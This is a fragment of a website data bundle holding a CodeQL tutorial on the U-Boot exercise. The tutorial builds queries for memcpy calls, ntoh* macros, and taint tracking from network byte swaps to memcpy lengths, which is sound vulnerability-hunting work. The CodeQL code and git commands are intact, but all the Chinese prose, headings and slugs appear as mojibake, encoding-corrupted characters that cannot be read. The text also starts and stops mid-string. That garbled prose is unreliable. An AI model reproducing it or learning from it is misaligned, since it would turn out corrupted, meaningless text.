16:22:20",lastUpdatedTimestamp:164908934e4},{title:"CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",frontmatter:{title:"CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼",date:"2022-04-04T00:00:00.000Z",permalink:"/sec/sa/codeql/uboot2",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","CodeQL"],tags:["CodeQL"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2001.CodeQL/01.%20CodeQL%20-%20UBoot%E7%BB%83%E4%B9%A0%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%8B%EF%BC%89.html",relativePath:"02.å®å¨/200.éæåæ/2001.CodeQL/01. CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼.md",key:"v-5155b7a4",path:"/sec/sa/codeql/uboot2/",headers:[{level:2,title:"3. ç¬¬ä¸ä¸ªæ¥è¯¢",slug:"_3-ç¬¬ä¸ä¸ªæ¥è¯¢",normalizedTitle:"3. ç¬¬ä¸ä¸ªæ¥è¯¢",charIndex:155},{level:3,title:"éè¿ Pull Requestæäº¤ä½ çè¯·æ±",slug:"éè¿-pull-requestæäº¤ä½ çè¯·æ±",normalizedTitle:"éè¿ pull requestæäº¤ä½ çè¯·æ±",charIndex:657},{level:3,title:"æäº¤å°mainåæ¯",slug:"æäº¤å°mainåæ¯",normalizedTitle:"æäº¤å°mainåæ¯",charIndex:745},{level:2,title:"4. è§£ææ¥è¯¢",slug:"_4-è§£ææ¥è¯¢",normalizedTitle:"4. è§£ææ¥è¯¢",charIndex:1305},{level:3,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:1308},{level:3,title:"æ¾å°åä¸ºmemcpyçå½æ°",slug:"æ¾å°åä¸ºmemcpyçå½æ°",normalizedTitle:"æ¾å°åä¸ºmemcpyçå½æ°",charIndex:1833},{level:2,title:"5. ä½¿ç¨ä¸åçç±»åè°è¯",slug:"_5-ä½¿ç¨ä¸åçç±»åè°è¯",normalizedTitle:"5. ä½¿ç¨ä¸åçç±»åè°è¯",charIndex:2064},{level:2,title:"6. ä½¿ç¨å¹¶å³èä¸¤ä¸ªåé",slug:"_6-ä½¿ç¨å¹¶å³èä¸¤ä¸ªåé",normalizedTitle:"6. ä½¿ç¨å¹¶å³èä¸¤ä¸ªåé",charIndex:2572},{level:2,title:"7. ç»§ç»­å³èä¸¤ä¸ªåé",slug:"_7-ç»§ç»­å³èä¸¤ä¸ªåé",normalizedTitle:"7. ç»§ç»­å³èä¸¤ä¸ªåé",charIndex:2935},{level:2,title:"8. æ´æ¹è¾åº",slug:"_8-æ´æ¹è¾åº",normalizedTitle:"8. æ´æ¹è¾åº",charIndex:3287},{level:2,title:"9. ç¼åèªå·±çç±»",slug:"_9-ç¼åèªå·±çç±»",normalizedTitle:"9. ç¼åèªå·±çç±»",charIndex:3540},{level:2,title:"10. æ°æ®æµåæ±¡ç¹è¿½è¸ª",slug:"_10-æ°æ®æµåæ±¡ç¹è¿½è¸ª",normalizedTitle:"10. æ°æ®æµåæ±¡ç¹è¿½è¸ª",charIndex:4514},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:7725}],excerpt:'<h1 id="codeql-ubootç»ä¹ é¡¹ç®-ä¸"><a class="header-anchor" href="#codeql-ubootç»ä¹ é¡¹ç®-ä¸">#</a> CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼</h1>\n<blockquote>\n<p>å¨ä¸ä¸ç¯ãCodeQL - Ubootç»ä¹ ï¼ä¸ï¼ãä»ç»äºGitlabæä¾çä¸ä¸ªç¨äºçæCodeQLç¨æ³çç»æé¡¹ç®CodeQL-ubootï¼åæ¶ä¹æç§é¡¹ç®çè¦æ±æ­å»ºäºCodeQLçåºç¡ä½¿ç¨ç¯å¢ãå¨è¿ä¸ç¯ä¸­ï¼å°±å¼å§æ ¹æ®é¡¹ç®çè¦æ±ï¼å®ææ¥è¯¢è¯­å¥çç¼åã</p>\n</blockquote>\n',headersStr:"3. ç¬¬ä¸ä¸ªæ¥è¯¢ éè¿ Pull Requestæäº¤ä½ çè¯·æ± æäº¤å°mainåæ¯ 4. è§£ææ¥è¯¢ è§£æ æ¾å°åä¸ºmemcpyçå½æ° 5. ä½¿ç¨ä¸åçç±»åè°è¯ 6. ä½¿ç¨å¹¶å³èä¸¤ä¸ªåé 7. ç»§ç»­å³èä¸¤ä¸ªåé 8. æ´æ¹è¾åº 9. ç¼åèªå·±çç±» 10. æ°æ®æµåæ±¡ç¹è¿½è¸ª åèèµæ",content:'# CodeQL - UBootç»ä¹ é¡¹ç®ï¼ä¸ï¼\n\n> å¨ä¸ä¸ç¯ãCodeQL - Ubootç»ä¹ ï¼ä¸ï¼ãä»ç»äºGitlabæä¾çä¸ä¸ªç¨äºçæCodeQLç¨æ³çç»æé¡¹ç®CodeQL-ubootï¼åæ¶ä¹æç§é¡¹ç®çè¦æ±æ­å»ºäºCodeQLçåºç¡ä½¿ç¨ç¯å¢ãå¨è¿ä¸ç¯ä¸­ï¼å°±å¼å§æ ¹æ®é¡¹ç®çè¦æ±ï¼å®ææ¥è¯¢è¯­å¥çç¼åã\n\n\n# 3. ç¬¬ä¸ä¸ªæ¥è¯¢\n\nä¸ä¸ç¯ä¸­ï¼æä»¬åéäºubooté¡¹ç®ä»£ç ï¼å¹¶ä¸å°å¶æ·»å å°äºvscode-starterä¸­ãè¿ä¸ç¯ä¸­çææä»£ç é½å¨è¿ä¸ªé¡¹ç®ä¸­è¿è¡ç¼ååæäº¤ãç¬¬ä¸èçç®çæ¯å®æä¸ä¸ªæç®åçæ¥è¯¢è¯­å¥çç¼åï¼å¹¶æäº¤å°githubä»åºä¸­ï¼ç±æºå¨äººå¤æ­ä½ çä»£ç æ¯å¦æ­£ç¡®ã\n\nç¼è¾3_function_definitions.qlï¼è¾å¥ä»¥ä¸åå®¹ï¼\n\nimport cpp\n\nfrom Function f\nwhere f.getName() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\næå¥½æ¯èªå·±è¾å¥è¿äºåå®¹ï¼èä¸æ¯ç´æ¥å¤å¶ç²è´´ãå¨è¾å¥çè¿ç¨ä¸­ï¼å¯ä»¥çå°vscodeçèªå¨æç¤ºã\n\nå³å»ï¼ç¹å»CodeQL: Run Queryï¼ä½ ä¼åç°ç¨åºå¨å³ä¾§å±ç¤ºäºè¿è¡çç»æã\n\n\n\nè¿ä¸ªæ¥è¯¢å¯ä»¥æ¾åºç¨åºä¸­çææåä¸ºstrlenæ¹æ³ï¼å¹¶å°å¶æ¾ç¤ºå°ç»æä¸­ï¼æä»¬ç¹å»ç»æä¸­çæ¹æ³åï¼å¯ä»¥å®ä½å°ä»£ç çä½ç½®ã\n\nä»¥ä¸åå®¹å°±æ¯ç¬¬ä¸èçæ¥è¯¢åå®¹äºï¼ç¬¬ä¸èçåé¢é¨åæä¾äºä¸¤ç§ä»£ç æäº¤çæ¹å¼ï¼ä»£ç æäº¤å¨åç»­çæ¯ä¸èé½ä¼ç¨å¾å°ï¼å¦æä¸çæçè¯ï¼å»ºè®®å¤ççã\n\n\n# éè¿ Pull Requestæäº¤ä½ çè¯·æ±\n\néè¿PRæäº¤å¾å¾åºç¨å¨å¤äººå±åç»´æ¤ä¸ä¸ªä»£ç ä»åºæ¶ãéè¿PRçæ¹å¼æäº¤å¯ä»¥ç´æ¥å¨PRä¸­è·è¸ªæ£æ¥å¨çæ§è¡æåµã\n\nä½æ¯è¿ç§æ¹å¼è¦æ¯ç´æ¥æäº¤å°mainåæ¯ä¸æ´å¤æãæäº¤çæµç¨å¦ä¸ï¼\n\n 1. å·æ°ä¸»åæ¯çåå®¹ï¼å°ä»£ç æäº¤å°è¯¥åæ¯ï¼ç¶åæ¨é\n    \n    git checkout main\n    git pull\n    git checkout -b step-3\n    git add .\n    git commit -a -m "First Query"\n    git push -u origin step-3\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. åèµ·ä¸ä¸ªPR\n\n 3. ç­å¾æ£æ¥å®æ¯ï¼å¹¶å¨PRçè¿ç¨ä¸­æ¾ç¤ºè¿åº¦ã\n\n 4. æ£æ¥å®æä¹åï¼å¦ææ¾ç¤ºç»¿è²åä»£è¡¨éè¿ã\n\n\n# æäº¤å°mainåæ¯\n\nè¿ç§æ¹å¼æ¯PRçæ¹å¼ç®åå¾å¤ï¼æä»¬å¨åç»­çæäº¤ä¸­é½ä¼ä½¿ç¨è¿ç§æ¹å¼ï¼\n\n 1. å°ä»£ç æ¨éå°è¯¾ç¨çè¿ç¨ä»åºä¸­\n    \n    git add .\n    git commit -m "Any message here - why not step 3"\n    git push origin main\n    \n    \n    1\n    2\n    3\n    \n\n2.ç­å¾æ£æ¥å®æï¼æ£æ¥å®æåè¿å¥ä¸ä¸èãæ£æ¥å¤±è´¥åå¯ä»¥ç¼è¾æä»¬çæ¥è¯¢è¯­å¥ï¼åæ¬¡æäº¤ã\n\n\n# 4. è§£ææ¥è¯¢\n\n\n# è§£æ\n\nè¿ä¸èä¸­ï¼å¯¹ä¸ä¸èæä»¬ç¼åçæ¥è¯¢è¯­å¥åäºä¸ä¸ªåæï¼å¹¶ä¸è®©æä»¬ç®åæ¹åä¸ä¸ä¸é¢çæ¥è¯¢å®æç¸åºçæ¥è¯¢ä»»å¡ã\n\nCodeQLä¸­çæ¥è¯¢ä¸è¬é½æå¦ä¸çç»æï¼\n\nimport å¼å¥ä¸ä¸ªCodeQLåº\n\nfrom åéçå£°æé¨å\nwhere æ¥è¯¢çé»è¾\nselect è¾åºçç»æ\n\n\n1\n2\n3\n4\n5\n\n\nååé¡¾ä¸ä¸æä»¬ä¸ä¸è¯¾çæ¥è¯¢è¯­å¥ï¼\n\nimport cpp\n\nfrom Function f\nwhere f.getName() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\nç¬¬ä¸å¥æ¯import cppï¼è¿æ¯ä¸ä¸ªå¯¼å¥çè¯­å¥ï¼åç»­æä»¬å¨æ¥è¯¢ä¸­ä½¿ç¨çææçå£°æç­ï¼é½æ¯éè¿è¿ä¸ªè¯­å¥å¯¼å¥çã\n\nç¬¬äºå¥æ¯from Function fï¼å£°æäºä¸ä¸ªåéfï¼å¶ä¸­Functionæ¯ä¸ä¸ªç±»ï¼è¯¥ç±»æ¯C/C++ä¸­çææçå½æ°çéåã\n\nå¨whereåé¢æ¥ççæ¯æä»¬æ¥è¯¢çè°è¯ï¼è°è¯è¿ä¸ªæ¦å¿µå¨åé¢ä¹å¸¸è¢«æå°ï¼å¯ä»¥ç®åçè§£ä¸ºä¸ä¸ªå½æ°ï¼åè¿éé¢çgetNameå°±æ¯ä¸ä¸ªè°è¯ï¼è¿ä¸ªä¸ºæ­¤æä¸ä¸ªè¿åå¼ï¼å½è¿ä¸ªè¿åå¼æ»¡è¶³ç­äºstrlenæ¡ä»¶æ¶ï¼å°±æç§selctçè¦æ±æ¾ç¤ºç»æã\n\n\n# æ¾å°åä¸ºmemcpyçå½æ°\n\n 1. ç¼è¾4_memcpy_definitions.ql\n 2. æç§ç¬¬ä¸é¨çæ¥è¯¢ä¸­çæ¥è¯¢è¯­å¥ï¼å°æ¥è¯¢çæ¡ä»¶ä¿®æ¹ä¸ºæ¥è¯¢åå­ä¸ºmemcpyã\n 3. è¿è¡æ¥è¯¢è¯­å¥ï¼æ¥çæ¥è¯¢çç»æ\n 4. æäº¤ä½ çæ¥è¯¢å°è¿ç¨ä»åº\n\nimport cpp\n\nfrom Function f \nwhere f.getName() = "memcpy"\nselect f, "function named memcpy"\n\n\n1\n2\n3\n4\n5\n\n\n\n# 5. ä½¿ç¨ä¸åçç±»åè°è¯\n\nå¨ç¬¬åèä¸­ï¼æä»¬ä½¿ç¨äºFunctionç±»å¹¶ä½¿ç¨äºgetNameè·åäºææçæ¹æ³åãèå¨è¿ä¸èä¸­ï¼æä»¬éè¦æ¥è¯¢ç»åºçä¸ä¸ªè½¬æ¢å­èåºçå®ï¼å®æ¯Cè¯­è¨ä¸­çä¸ä¸ªéè¦çå®ä¹ï¼ä¸çæCçæåä¹ä¸ç¨æå¿ï¼è¿éåªæ¯ç¨æ¥å¼å¥å¶ä»çä¸äºæ¥è¯¢çç±»ï¼ãè¿æ¬¡çæ¥è¯¢ä»£ç åä¸æ¬¡çç±»ä¼¼ï¼\n\nimport cpp\n\nfrom Macro m\nwhere m.getName() = "ntohl" \n        or m.getName() = "ntohll"\n        or m.getName() = "ntohs"\nselect m,"macro named ntoh*"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nç±äºæ¥è¯¢çæ¡ä»¶æä¸ä¸ªï¼ntohlãntohllãntohsï¼æä»¬å¯ä»¥ä½¿ç¨oræ¥å¹¶åå¤ä¸ªæ¥è¯¢æ¡ä»¶ãä¹å¯ä»¥ä½¿ç¨æ­£åè¡¨è¾¾å¼çåæ³ï¼\n\nwhere m.getName().regexpMatch("ntoh(s|l|ll)")\n\n\n1\n\n\næèä½¿ç¨inçæ¹å¼ï¼\n\nwhere m.getName() in ["ntohs","ntohl","ntohll"]\n\n\n1\n\n\nä»¥ä¸ä¸ç§æ¹å¼åå¯ã\n\n\n# 6. ä½¿ç¨å¹¶å³èä¸¤ä¸ªåé\n\nä»¥ä¸çå èä¸­ï¼å¨fromåé¢æä»¬åªå£°æäºä¸ä¸ªåéï¼å¨è¿ä¸èæä»¬éè¦å£°æä¸¤ä¸ªåéï¼å¹¶ä½¿ç¨ä¸¤ä¸ªåéä¹é´çå³ç³»èåå®æç¸å³çæ¥è¯¢ãè¿ç§æ¹å¼æå©äºå¸®æä»¬æ¾åºå½æ°çè°ç¨ã\n\n 1. ç¼è¾6_memcpy_calls.ql\n 2. ä½¿ç¨ä»£è¡¨å½æ°è°ç¨çç±»å¹¶å£°æåé\n 3. ä½¿ç¨å½æ°è°ç¨ç±»çç¸å³è°è¯æ¥æ¾å½æ°çè°ç¨ä½ç½®\n 4. åç¬¬åæ­¥ä¸­çå½æ°æ¥æ¾ç»åï¼æ¾åºå½æ°memcpyçè°ç¨ä½ç½®\n 5. å®æå¹¶è¿è¡æ¥è¯¢ï¼æ²¡æé®é¢åï¼æäº¤æ¥è¯¢\n\nimport cpp\n\nfrom Function f, FunctionCall call\n\nwhere call.getTarget() = f \n    and f.getName() = "memcpy"\nselect call\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 7. ç»§ç»­å³èä¸¤ä¸ªåé\n\nå¨ç¬¬äºèä¸­ï¼ç¼åäºä¸ä¸ªæ¥è¯¢ï¼æ¥æ¾ææçåä¸ºntoh*çå®ãå¨ç¬¬å­èä¸­ç¼åäºä¸ä¸ªæ¥è¯¢ï¼æ¥æ¾ææåä¸ºmemcpyçå½æ°çè°ç¨ä½ç½®ãèå¨è¿ä¸èä¸­ï¼éè¦æ¾å°ä»¥ä¸åä¸ºntoh*çå®çè°ç¨ä½ç½®ã\n\n 1. ç¼è¾7_macro_invocations.ql\n 2. ä½¿ç¨èªå¨è¡¥å¨ï¼æ¾åºæ¥æ¾å®è°ç¨çç±»\n 3. æ¾åºä»£è¡¨å®è°ç¨çè°è¯\n 4. æ¥è¯¢å®çåç§°åå®çè°ç¨ä½ç½®\n 5. è¿è¡æ¥è¯¢ï¼æäº¤ä»£ç \n\nimport cpp\n\nfrom Macro m, MacroInvocation mi\nwhere m.getName().regexpMatch("ntoh(s|l|ll)")\n    and mi.getMacro() = m\nselect m,mi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 8. æ´æ¹è¾åº\n\nå¨ä¸ä¸èæä»¬æ¾å°äºææåä¸ºntoh*çå®ä¹ï¼å¹¶ä¸æ¥æ¾äºææçè°ç¨ä½ç½®ï¼èå¨è¿ä¸èä¸­ï¼éè¿ MacroInvocation è¿ä¸ªç±»æ¥æ¥è¯¢ "ntohs" ç­å®çè°ç¨ï¼å¹¶éè¿ getExpr() è¿ä¸ªæ¹æ³è¿è¡å®çå±å¼ï¼å¾å°ç¸åºçä»£ç çæ®µã\n\nimport cpp\n\nfrom MacroInvocation mi\nwhere mi.getMacroName().regexpMatch("ntoh(s|l|ll)")\nselect mi.getExpr()\n\n\n1\n2\n3\n4\n5\n\n\n\n# 9. ç¼åèªå·±çç±»\n\nå¨ä¸é¢çæ¥è¯¢ä¸­ï¼æä»¬ä½¿ç¨è¿FunctionãFunctionCallãMarcoãMarcoInvocationç­ç±»ï¼è¿äºç±»é½æ¯CodeQLæä¾ç»æä»¬è°ç¨çãæä»¬ä¹å¯ä»¥å®ä¹ä¸ä¸ªèªå·±çç±»ï¼å¨æ¬èä¸­ï¼éè¿å®ç°ä¸ä¸ªèªå·±çç±»ï¼è½èªå®ä¹ä¸ä¸ªèªå·±æ³è¦çæ°æ®éåãå¦ææç¹æµå¯ä»¥çç CodeQL å³äºç±»çç¸å³ææ¡£ãæ¥è¯¢è¯­å¥ä¸­çç±»ä¸­ï¼åéè¿ exists éè¯åå»ºä¸ä¸ªä¸´æ¶åé mi æ¥è¡¨ç¤ºè¢«è°ç¨çå®çåå­ï¼å¦æè¢«è°ç¨ççå®å±å¼ååå½åä»£ç çæ®µç¸ç­ï¼åè¿ä¸ªè¡¨è¾¾å¼å±äºè¿ä¸ªéåã\n\nå¨è¿ä¸èä¸­ï¼æä»¬ç¼åçç±»å°ä¸ä¸èçåå®¹è¿è¡ä¸ä¸ªå°è£ï¼å°è£å®æä¹åï¼åªéè¦è°ç¨ç¸åºçç±»å³å¯æ¥è¯¢åºç»æã\n\n 1. ç¼è¾9_class_network_byteswap.ql\n 2. ç¼åä¸ä¸ªç±»ï¼ç»§æ¿Exprï¼Expræ¯ææè¡¨è¾¾å¼çç±»\n 3. ä½¿ç¨existsï¼å®ææä»¬éè¦çæ¥è¯¢ï¼å¹¶è¿åç¸åºçç»æ\n 4. ä¿®æ¹å¦ä¸çæ¨¡ç\n\nimport cpp\n\nclass NetworkByteSwap extends Expr {\n  NetworkByteSwap () {\n    // TODO: replace <class> and <var>\n    exists(<class> <var> |\n      // TODO: <condition>\n    )\n  }\n}\n\nfrom NetworkByteSwap n\nselect n, "Network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n5. å®ææ¥è¯¢ï¼è¿è¡å¹¶æäº¤\n\n\nimport cpp\n\nclass NetworkByteSwap extends Expr {\n  NetworkByteSwap() {\n    exists(MacroInvocation mi |\n      mi.getMacroName().regexpMatch("ntoh(s|l|ll)") and\n      this = mi.getExpr()\n    )\n  }\n}\n\nfrom NetworkByteSwap n\nselect n, "Network byte swap"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 10. æ°æ®æµåæ±¡ç¹è¿½è¸ª\n\nç¬¬åèæ¯è¿ä¸ªé¡¹ç®çæåä¸èãå¨ç¬¬ä¹æ­¥ï¼æä»¬å¨ä»£ç ä¸­åç°äºä¸äºå¯ä»¥è¿ç¨è¾å¥çè¡¨è¾¾å¼ãä»ä»¬å¯ä»¥è¢«è®¤ä¸ºæ¯è¿ç¨è¾å¥ç æºãæºè¿ä¸ªæ¦å¿µæ¯æ±¡ç¹åæçéè¦æ¦å¿µï¼ç®åçè§£å°±æ¯ç¨æ·è¾å¥æ¶æä»£ç çä½ç½®ãå¨ç¬¬å­æ­¥ä¸­ï¼æä»¬åç°äºmemcpyçè°ç¨ï¼è¿äºè°ç¨å¯è½æ¯ä¸å®å¨çï¼å ä¸ºä»ä»¬çé¿åº¦æ¯è¢«è¿ç¨ç¨æ·å¯ä»¥æ§å¶çãè¿äºå¯ä»¥ç§°ä¸ºæ±èç¹ï¼æ±èç¹æ¯äº§çä¸å®å¨æä½çä½ç½®ãè¿éçmemcpyæ¥åå¯æ§å¶çé¿åº¦çå¼ã\n\néè¿ç»åä¸é¢çä¿¡æ¯ï¼æä»¬ç¥éå½æ°æ®æµä»ä¸ä¸ªç¨æ·å¯æ§çsourceæµåå°å­å¨é£é©çsinkä½ç½®çæ¶åï¼ä¸ä¸ªç¨åºæ¯å­å¨å®å¨é£é©çãä½æ¯æä»¬æ¯æä¹ç¥éæ°æ®ä»ä¸ä¸ªsourceæµåsinkçå¢ï¼è¿éæå°äº**æ°æ®æµãæ±¡ç¹åæææ¯ã**å ä¸ºå¯è½å­å¨ä¸åçsourceåsinkï¼è¿æ ·ç»åèµ·æ¥ï¼å¦æä½¿ç¨äººå·¥çæ¹å¼ï¼å¯è½äº§çå¤§éçå·¥ä½éãCodeQLæ¿æä»¬è¿è¡åæãä½ åªéè¦ç¼åä¸ä¸ªæ¥è¯¢ï¼å°±å¯ä»¥åç°9ä¸ªçå®å­å¨çå®å¨é£é©ã\n\nä¸ºäºè¾¾å°è¿ä¸ªç®æ ï¼æä»¬ä½¿ç¨CodeQLæ±¡ç¹åæåºï¼è¿ä¸ªåºå¯ä»¥å®ä¹sourceåsinkï¼å½å¯¹åºçæ°æ®ä»sourceæµè½¬å°sinkæ¶ï¼hashFlowPathæç«ã\n\nå¨è¿ä¸èä¸­ï¼æä»¬éè¦ç¼åä¸ä¸ªæ±¡ç¹åæçæ¥è¯¢ã\n\n 1. ç¼è¾10_taint_tracking.ql\n\n 2. ä½¿ç¨å¦ä¸çæ¨¡æ¿æä»¶\n    \n    /**\n     * @kind path-problem\n     */\n    \n    import cpp\n    import semmle.code.cpp.dataflow.TaintTracking\n    import DataFlow::PathGraph\n    \n    class NetworkByteSwap extends Expr {\n      // TODO: copy from previous step\n    }\n    \n    class Config extends TaintTracking::Configuration {\n      Config() { this = "NetworkToMemFuncLength" }\n    \n      override predicate isSource(DataFlow::Node source) {\n        // TODO\n      }\n      override predicate isSink(DataFlow::Node sink) {\n        // TODO\n      }\n    }\n    \n    from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink\n    where cfg.hasFlowPath(source, sink)\n    select sink, source, sink, "Network byte swap flows to memcpy"\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 3. å¤å¶ç¬¬ä¹æ­¥çèªå®ä¹ç±»ï¼ç¼åis SourceåisSinkå®ä¹æºåæ±èã\n    \n    * å¨ç¬¬ä¹æ­¥å·²ç»ç¼åäºè¯å«ntoh*çç±»ï¼è¿éåªéè¦ä½¿ç¨instanceå³é®å­è¿è¡å¤æ­å³å¯\n    * æ³¨æsourceåéæ¯ç±»åçDataFlow::Nodeï¼èä½ çNetworkByteSwapç±»æ¯çå­ç±»Exprï¼æä»¥æä»¬ä¸è½åªåsource instanceof NetworkByteSwapã\n\n 4. è¿è¡æ¥è¯¢ï¼æäº¤ã\n\n\n/**\n * @kind path-problem\n */\n\nimport cpp\nimport semmle.code.cpp.dataflow.TaintTracking\nimport DataFlow::PathGraph\n\nclass NetworkByteSwap extends Expr {\n  NetworkByteSwap() {\n    exists(MacroInvocation mi |\n      mi.getMacroName().regexpMatch("ntoh(s|l|ll)") and\n      this = mi.getExpr()\n    )\n  }\n}\n\nclass Config extends TaintTracking::Configuration {\n  Config() { \n      this = "NetworkToMemFuncLength" \n    }\n\n  override predicate isSource(DataFlow::Node source) { \n      source.asExpr() instanceof NetworkByteSwap \n    }\n  override predicate isSink(DataFlow::Node sink) {\n    exists(FunctionCall call |\n      call.getTarget().getName() = "memcpy" and\n      sink.asExpr() = call.getArgument(2) and\n      not call.getArgument(1).isConstant()\n    )\n  }\n}\n\nfrom Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere cfg.hasFlowPath(source, sink)\nselect sink, source, sink, "Network byte swap flows to memcpy"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\næ°å®ä¹ç Config ç±»ç»§æ¿äº TaintTracking::Configurationãå¨è¿ä¸ªç±»ä¸­ï¼å¯¹ isSource åisSinkè¿ç¨éè½½ï¼isSourceè°è¯­å®ä¹ä¸ºæ±¡ç¹çæºå¤´ï¼è isSink å®ä¹ä¸ºæ±¡ç¹çå»å¤ã\n\nææ¶åï¼è¿ç¨è¾å¥çæ°æ®å¯è½ç»è¿ ntoh å½æ°å¤çï¼éè¿è½¬æ¢å­èåºå¾å°ç¸åºçæ°å­ãè memcpy çç¬¬ 2 ä¸ªåæ°å¦ææ§å¶ä¸å½ï¼å¯é ææ°æ®æº¢åºãå°ä¸é¢ä¸¤ä¸ªç»è®ºç»åèµ·æ¥ï¼å¦ææä¸ä¸ªè¿ç¨è¾å¥çæ°æ®éè¿å­èåºåæ¢å¾å°çæ°å­ï¼å¨æªç»è¿æ ¡éªçæåµä¸ï¼ä½ä¸ºäº memcpy çç¬¬äºä¸ªåæ°ï¼é£ä¹å°±æå¯è½é ææ°æ®æº¢åºã\n\nç§ç Github å®å¨å¢éçæç« ï¼å¯ä»¥ç§ç«ç»èçè¡¥å¨æ°æ®æ¥è¯¢è¯­å¥ã\n\nå¨ isSource ä¸­ï¼æä»¬éè¿å¤æ­ source ç Expr æ¯å¦æ¯ NetworkByteSwap è¿ä¸ªç±»ï¼æ¥å¤æ­æ±¡ç¹çæºå¤´ã\n\nå¨ isSink ä¸­ï¼æä»¬ä½¿ç¨äºè¾å©ç±» FunctionCall å¤æ­å½æ°è°ç¨æ¯å¦ä¸º memcpy ä¸ sink çä»£ç çæ®µæ¯å¦ä¸º memcpy çç¬¬äºä¸ªåæ°ï¼æåä¸å¥åæ¯å¤æ­å½æ°çç¬¬ä¸ä¸ªåæ°æ¯å¦ä¸ºå¸¸éï¼å¦æä¸ºå¸¸éçè¯åºæ¬ä¸å¯è½åºç°é®é¢ï¼ææå¿½ç¥ã\n\n\n\n\n# åèèµæ\n\n 1. https://zhuanlan.zhihu.com/p/137569940\n 2. https://codeql.github.com/docs/ql-language-reference',normalizedContent:'# codeql - ubootç»ä¹ é¡¹ç®ï¼ä¸ï¼\n\n> å¨ä¸ä¸ç¯ãcodeql - ubootç»ä¹ ï¼ä¸ï¼ãä»ç»äºgitlabæä¾çä¸ä¸ªç¨äºçæcodeqlç¨æ³çç»æé¡¹ç®codeql-ubootï¼åæ¶ä¹æç§é¡¹ç®çè¦æ±æ­å»ºäºcodeqlçåºç¡ä½¿ç¨ç¯å¢ãå¨è¿ä¸ç¯ä¸­ï¼å°±å¼å§æ ¹æ®é¡¹ç®çè¦æ±ï¼å®ææ¥è¯¢è¯­å¥çç¼åã\n\n\n# 3. ç¬¬ä¸ä¸ªæ¥è¯¢\n\nä¸ä¸ç¯ä¸­ï¼æä»¬åéäºubooté¡¹ç®ä»£ç ï¼å¹¶ä¸å°å¶æ·»å å°äºvscode-starterä¸­ãè¿ä¸ç¯ä¸­çææä»£ç é½å¨è¿ä¸ªé¡¹ç®ä¸­è¿è¡ç¼ååæäº¤ãç¬¬ä¸èçç®çæ¯å®æä¸ä¸ªæç®åçæ¥è¯¢è¯­å¥çç¼åï¼å¹¶æäº¤å°githubä»åºä¸­ï¼ç±æºå¨äººå¤æ­ä½ çä»£ç æ¯å¦æ­£ç¡®ã\n\nç¼è¾3_function_definitions.qlï¼è¾å¥ä»¥ä¸åå®¹ï¼\n\nimport cpp\n\nfrom function f\nwhere f.getname() = "strlen"\nselect f, "a function named strlen"\n\n\n1\n2\n3\n4\n5\n\n\næå¥½æ¯èªå·±è¾å¥è¿äºåå®¹ï¼èä¸æ¯ç´æ¥å¤å¶ç²è´´ãå¨è¾å¥çè¿ç¨ä¸­ï¼å¯ä»¥çå°vscodeçèªå¨æç¤ºã\n\nå³å»ï¼ç¹å»codeql: run queryï¼ä½ ä¼åç°ç¨åºå¨å³ä¾§å±ç¤ºäºè¿è¡çç»æã\n\n\n\nè¿ä¸ªæ¥è¯¢å¯ä»¥æ¾åºç¨åºä¸­çææåä¸ºstrlenæ¹æ³ï¼å¹¶å°å¶æ¾ç¤ºå°ç»æä¸­ï¼æä»¬ç¹å»ç»æä¸­çæ¹æ³åï¼å¯ä»¥å®ä½å°ä»£ç çä½ç½®ã\n\nä»¥ä¸åå®¹å°±æ¯ç¬¬ä¸èçæ¥è¯¢åå®¹äºï¼ç¬¬ä¸èçåé¢é¨åæä¾äºä¸¤ç§ä»£ç æäº¤çæ¹å¼ï¼ä»£ç æäº¤å¨åç»­çæ¯ä¸èé½ä¼ç¨å¾å°ï¼å¦æä¸çæçè¯ï¼å»ºè®®å¤ççã\n\n\n# éè¿ pull requestæäº¤ä½ çè¯·æ±\n\néè¿præäº¤å¾å¾åºç¨å¨å¤äººå±åç»´æ¤ä¸ä¸ªä»£ç ä»åºæ¶ãéè¿prçæ¹å¼æäº¤å¯ä»¥ç´æ¥å¨prä¸­è·è¸ªæ£æ¥å¨çæ§è¡æåµã\n\nä½æ¯è¿ç§æ¹å¼è¦æ¯ç´æ¥æäº¤å°mainåæ¯ä¸æ´å¤æãæäº¤çæµç¨å¦ä¸ï¼\n\n 1. å·æ°ä¸»åæ¯çåå®¹ï¼å°ä»£ç æäº¤å°è¯¥åæ¯ï¼ç¶åæ¨é\n    \n    git checkout main\n    git pull\n    git checkout -b step-3\n    git add .\n    git commit -a -m "first query"\n    git push -u origin step-3\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 2. åèµ·ä¸ä¸ªpr\n\n 3. ç­å¾